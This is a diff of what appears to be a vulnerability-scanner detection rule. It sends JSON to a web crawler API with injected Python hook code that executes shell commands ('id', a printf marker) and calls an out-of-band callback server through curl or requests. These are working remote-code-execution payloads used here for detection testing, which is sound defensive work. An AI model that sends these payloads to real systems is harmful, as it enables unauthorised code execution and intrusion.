@@ -75,14 +75,14 @@ actions: {
         value: "application/json"
       }
     ]
-    data: "{\"urls\":[\"raw://<html><body>test</body></html>\"],\"hooks\":{\"code\":{\"on_page_context_created\":\"raise __import__(\\\"builtins\\\").Exception(__import__(\\\"os\\\").popen(\\\"id\\\").read())\\nasync def hook(page, context, **kwargs):\\n    return page\"}}}"
+    data: "{\"urls\":[\"raw://<html><body>test</body></html>\"],\"hooks\":{\"code\":{\"on_page_context_created\":\"raise __import__(\\\"builtins\\\").Exception(__import__(\\\"os\\\").popen(\\\"printf %x 133713371337\\\").read())\\nasync def hook(page, context, **kwargs):\\n    return page\"}}}"
     response: {
       http_status: 200
       expect_all: {
         conditions: [
           {
             body: {}
-            contains: "uid="
+            contains: "1f21f020c9"
           }
         ]
       }
@@ -102,7 +102,7 @@ actions: {
         value: "application/json"
       }
     ]
-    data: "{\"urls\":[\"raw://<html><body>test</body></html>\"],\"hooks\":{\"code\":{\"on_page_context_created\":\"__import__(\\\"os\\\").system(\\\"curl {{ T_CBS_URI }}\\\")\\nasync def hook(page, context, **kwargs):\\n    return page\"}}}"
+    data: "{\"urls\":[\"raw://<html><body>test</body></html>\"],\"hooks\":{\"code\":{\"on_page_context_created\":\"__import__(\'requests\').get(\'{{ T_CBS_URI }}\')\\nasync def hook(page, context, **kwargs):\\n    return page\"}}}"
   }
 }
 
